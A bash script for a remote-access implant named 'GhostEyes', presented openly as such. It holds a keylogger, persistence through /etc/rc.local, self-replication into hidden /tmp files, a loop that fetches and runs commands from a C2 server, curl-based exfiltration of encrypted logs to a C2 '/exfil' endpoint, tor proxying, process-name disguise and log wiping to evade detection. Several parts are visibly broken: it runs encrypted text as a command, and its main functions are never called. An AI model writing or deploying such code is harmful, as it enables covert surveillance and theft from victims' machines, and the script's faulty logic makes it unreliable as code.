#!/bin/bash

ROOT_CA_KEY="/tmp/root_ca.key"
ROOT_CA_PEM="/tmp/root_ca.pem"
ENCRYPTION_KEY_FILE="/tmp/encryption.key"
PERSISTENCE_SCRIPT="/etc/rc.local"
C2_SERVER="127.0.0.1"
C2_PORT="8080"
TUNNEL_PORT="9999"
LOG_FILE="/var/log/.ghosteyes_log"
KEYLOG_FILE="/tmp/.ghosteyes_keylog"
ADMIN_USER="admin"
KEYLOG_INTERVAL=5
TOOL_NAME="GhostEyes"
CLEANUP_SCRIPT="/tmp/.cleanup_ghosteyes.sh"
HIDE_SCRIPT="/tmp/.hide_ghosteyes.sh"

ADMIN_COMMANDS=("Show Network Info" "Execute Command" "Set Encryption Key Rotation" "View Logs" "Exit" "Revert Interactions" "Stealth Mode" "Show Keylog")

GhostEyesTool() {
    local TOOL_NAME="GhostEyes"
    local LOG_FILE="/var/log/.ghosteyes_log"
    local KEYLOG_FILE="/tmp/.ghosteyes_keylog"
    local ENCRYPTION_KEY_FILE="/tmp/encryption.key"
    local ROOT_CA_KEY="/tmp/root_ca.key"
    local ROOT_CA_PEM="/tmp/root_ca.pem"
    local C2_SERVER="127.0.0.1"
    local C2_PORT="8080"
    local PERSISTENCE_SCRIPT="/etc/rc.local"

    generate_root_ca() {
        openssl genpkey -algorithm RSA -out "$ROOT_CA_KEY" -pkeyopt rsa_keygen_bits:4096
        openssl req -key "$ROOT_CA_KEY" -new -x509 -out "$ROOT_CA_PEM" -subj "/CN=$TOOL_NAME"
    }

    rotate_encryption_key() {
        local new_key=$(openssl rand -base64 32)
        echo "$new_key" > "$ENCRYPTION_KEY_FILE"
    }

    encrypt_command() {
        local command="$1"
        local encryption_key=$(cat "$ENCRYPTION_KEY_FILE")
        echo "$command" | openssl enc -aes-256-cbc -base64 -pass pass:"$encryption_key"
    }

    decrypt_command() {
        local encrypted_command="$1"
        local encryption_key=$(cat "$ENCRYPTION_KEY_FILE")
        echo "$encrypted_command" | openssl enc -aes-256-cbc -d -base64 -pass pass:"$encryption_key"
    }

    setup_communication_tunnel() {
        tor & 
        export http_proxy="socks5://127.0.0.1:9050"
        export https_proxy="socks5://127.0.0.1:9050"
    }

    obfuscate_process_name() {
        prname=$(ps aux | awk 'NR==1{print $2}')
        prname="bash"
        prname="$prname --hidden"
        exec -a "$prname" "$0"
    }

    data_exfiltration() {
        local data="$1"
        local exfiltrated_data=$(encrypt_command "$data")
        curl -X POST -d "data=$exfiltrated_data" "http://$C2_SERVER:$C2_PORT/exfil"
    }

    execute_command_in_memory() {
        local command="$1"
        bash -c "$command" &
    }

    self_replication() {
        local replication_target="/tmp/.replicated_tool"
        cp "$0" "$replication_target"
        chmod +x "$replication_target"
        echo "$replication_target &" >> "$PERSISTENCE_SCRIPT"
    }

    reverse_last_interaction() {
        local last_interaction=$(tail -n 1 "$KEYLOG_FILE")
        if [[ "$last_interaction" == *"execute"* ]]; then
            local command=$(echo "$last_interaction" | sed 's/execute: //')
            echo "Reversing command: $command"
        fi
    }

    setup_keylogger() {
        while true; do
            xinput --list --id-only | while read -r id; do
                xinput test "$id" | while read -r event; do
                    echo "$(date): $event" >> "$KEYLOG_FILE"
                done
            done
            sleep "$KEYLOG_INTERVAL"
        done &
    }

    stealth_mode() {
        echo "Activating Stealth Mode..."
        mv "$0" "/tmp/.hidden_ghosteyes.sh"
        chmod +x "/tmp/.hidden_ghosteyes.sh"
        echo "/tmp/.hidden_ghosteyes.sh &" >> "$PERSISTENCE_SCRIPT"
        exit
    }

    cleanup() {
        echo "Performing system cleanup to evade detection..."
        rm -f "$KEYLOG_FILE"
        rm -f "$LOG_FILE"
        rm -f "$ENCRYPTION_KEY_FILE"
        rm -f "$ROOT_CA_KEY"
        rm -f "$ROOT_CA_PEM"
        rm -f "$CLEANUP_SCRIPT"
        rm -f "$HIDE_SCRIPT"
    }

    command_listener() {
        while true; do
            command=$(curl -s "http://$C2_SERVER:$C2_PORT/command")
            if [ ! -z "$command" ]; then
                encrypted_command=$(encrypt_command "$command")
                execute_command_in_memory "$encrypted_command"
            fi
            sleep 1
        done
    }

    traffic_injection() {
        while true; do
            echo "Sending heartbeat data" | curl --silent --data "heartbeat=true" "http://$C2_SERVER:$C2_PORT/heartbeat"
            sleep 10
        done
    }

    show_network_info() {
        echo "Gathering network information..."
        echo -e "\nIP Address Information:"
        ip a
        echo -e "\nActive Network Connections:"
        netstat -tulnp
        echo -e "\nRouting Table:"
        route -n
        echo -e "\nCurrent Interface Statistics:"
        ifstat
        echo -e "\nDNS Configuration:"
        cat /etc/resolv.conf
        echo -e "\nNetwork Interfaces:"
        ifconfig -a
    }

    execute_command_in_background() {
        local command="$1"
        bash -c "$command" &
    }

    show_logs() {
        echo "Displaying GhostEyes logs:"
        tail -n 50 "$LOG_FILE"
    }
    
    admin_panel() {
        while true; do
            echo "$TOOL_NAME Admin Panel - Please choose an option:"
            select option in "${ADMIN_COMMANDS[@]}"; do
                case $option in
                    "Show Network Info")
                        show_network_info
                        break
                        ;;
                    "Execute Command")
                        echo "Enter command to execute:"
                        read user_command
                        execute_command_in_memory "$user_command"
                        break
                        ;;
                    "Set Encryption Key Rotation")
                        echo "Set encryption key rotation interval (in seconds):"
                        read interval
                        while true; do
                            rotate_encryption_key
                            sleep "$interval"
                        done
                        break
                        ;;
                    "View Logs")
                        show_logs
                        break
                        ;;
                    "Revert Interactions")
                        reverse_last_interaction
                        break
                        ;;
                    "Stealth Mode")
                        stealth_mode
                        break
                        ;;
                    "Show Keylog")
                        echo "Displaying Keylog:"
                        cat "$KEYLOG_FILE"
                        break
                        ;;
                    "Exit")
                        exit
                        ;;
                    *)
                        echo "Invalid option, try again."
                        break
                        ;;
                esac
            done
        done
    }

    start_tool() {
        self_replication
        setup_communication_tunnel
        command_listener &
        obfuscate_process_name
        tail -f $LOG_FILE | while read -r line; do
            data_exfiltration "$line"
        done &
        traffic_injection &
        setup_keylogger
        admin_panel
    }
}
